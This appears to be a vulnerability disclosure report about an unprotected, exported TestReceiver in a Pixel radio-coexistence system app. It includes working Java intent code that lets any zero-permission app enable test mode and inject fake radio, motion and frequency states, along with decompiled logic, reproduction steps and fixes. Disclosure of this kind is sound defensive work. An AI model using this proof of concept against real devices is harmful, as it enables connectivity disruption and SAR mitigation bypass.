# VRP Report #42: Scone Coex TestReceiver — Zero-Permission Radio State Manipulation

## Summary
The `com.google.android.apps.scone` (Pixel connectivity/radio stack app) exports a `TestReceiver` broadcast receiver with **no permission protection** in the manifest. Any unprivileged app can:
1. Enable test mode in Scone's coexistence (coex) service
2. Send `SIMULATE_STATE` or `SIMULATE_DYNAMIC_FREQUENCY` intents that are forwarded to the privileged `StateService` (InCallService)
3. Manipulate WiFi/cellular antenna coexistence states

## Severity
**HIGH** — Integrity impact on radio subsystem of a highly-privileged system app

## Affected Component
- **Package**: `com.google.android.apps.scone`
- **Component**: `com.google.android.apps.scone.coex.TestReceiver`
- **Manifest declaration**: `<receiver android:exported="true" android:name="com.google.android.apps.scone.coex.TestReceiver"/>` (no intent-filter, no permission)
- **Target service**: `com.google.android.apps.scone.coex.StateService` (extends InCallService)

## Vulnerability Details

### Root Cause
TestReceiver is statically declared as `exported="true"` with no `android:permission` attribute and no intent-filter. This means any app can send explicit broadcasts to it.

### Attack Chain

**Step 1: Enable test mode**
```java
Intent enableTest = new Intent("com.google.android.apps.scone.coex.SET_TEST_MODE");
enableTest.setComponent(new ComponentName("com.google.android.apps.scone",
    "com.google.android.apps.scone.coex.TestReceiver"));
enableTest.putExtra("test_mode", true);
sendBroadcast(enableTest);
```

This sets the static boolean `dyc.b = true` in Scone's process.

**Step 2: Simulate arbitrary coex state**
```java
Intent simState = new Intent("com.google.android.apps.scone.coex.SIMULATE_STATE");
simState.setComponent(new ComponentName("com.google.android.apps.scone",
    "com.google.android.apps.scone.coex.TestReceiver"));
simState.putExtra("motion_state", (byte) 1);
simState.putExtra("call_state", 1);
simState.putExtra("wifi_state", 2);
simState.putExtra("cell_state", 1);
sendBroadcast(simState);
```

When test mode is active, TestReceiver forwards the intent directly to StateService via `context.startService(intent)`.

**Step 3: Simulate dynamic frequency**
```java
Intent simFreq = new Intent("com.google.android.apps.scone.coex.SIMULATE_DYNAMIC_FREQUENCY");
simFreq.setComponent(new ComponentName("com.google.android.apps.scone",
    "com.google.android.apps.scone.coex.TestReceiver"));
simFreq.putExtra("frequency", 2400);
simFreq.putExtra("bandwidth", 40);
sendBroadcast(simFreq);
```

### Code Analysis

**TestReceiver.java** — no permission check, no build-type guard:
```java
public final void onReceive(Context context, Intent intent) {
    // ... initialization ...
    if (fmo.a(context)) {  // only blocks non-system users
        return;
    }
    String action = intent.getAction();
    if ("com.google.android.apps.scone.coex.SET_TEST_MODE".equals(action)) {
        boolean booleanExtra = intent.getBooleanExtra("test_mode", !dyc.b);
        dyc.b = booleanExtra;  // SETS TEST MODE — NO AUTH CHECK
    } else if ("com.google.android.apps.scone.coex.SIMULATE_STATE".equals(action) ||
               "com.google.android.apps.scone.coex.SIMULATE_DYNAMIC_FREQUENCY".equals(action)) {
        if (dyc.b) {
            intent.setComponent(new ComponentName(context, StateService.class));
            context.startService(intent);  // FORWARDS DIRECTLY TO STATESERVICE
        }
    }
}
```

**Key observations:**
- `emw.a` (`!"user".equals(Build.TYPE)`) is only checked in `StateService.onDestroy()` for dynamic receiver registration. The **static manifest registration** of TestReceiver has no build-type guard.
- `fmo.a(context)` only checks for non-system users — the main user (user 0) passes.
- `dyc.b` is a static boolean with no additional validation.

### StateService Context
StateService is an `InCallService` that manages:
- Context Hub (NanoApp) communication for motion/hall effect/cap sensors
- WiFi/cellular antenna coexistence decisions
- SAR (Specific Absorption Rate) mitigation state
- Dynamic frequency management
- USB DisplayPort alt mode detection

Scone holds privileged permissions: `MODIFY_PHONE_STATE`, `SATELLITE_COMMUNICATION`, `CONTROL_INCALL_EXPERIENCE`, `ACCESS_CONTEXT_HUB`, `NETWORK_SCAN`, `OVERRIDE_WIFI_CONFIG`, `RESTART_WIFI_SUBSYSTEM`, `RESTART_TELEPHONY_PROCESS`.

## Impact
1. **Radio coexistence manipulation**: An attacker can force the device into arbitrary coex states, disrupting WiFi/cellular connectivity
2. **Antenna misconfiguration**: Simulated states bypass real sensor data, causing the system to make incorrect antenna switching decisions
3. **SAR compliance bypass**: Motion state manipulation could cause the device to use incorrect SAR mitigation tables, potentially exceeding emission limits
4. **Connectivity DoS**: Rapid state cycling could destabilize the radio subsystem

## Reproduction
1. Install PoC APK (zero permissions required)
2. Launch `SconeTestModeActivity`
3. Observe via logcat: `adb logcat -s TestCoexService StateService`
4. Verify: "Setting test mode to: true" followed by intent forwarding to StateService

## Fix Recommendation
1. Remove `android:exported="true"` from TestReceiver declaration
2. Or add `android:permission="android.permission.MODIFY_PHONE_STATE"` 
3. Or add a build-type check (`emw.a`) in `onReceive()` before processing any action

## Device
- Pixel 6a, Android 17, Build CP2A.260605.012
- Scone package version from pulled APK (14.6MB)
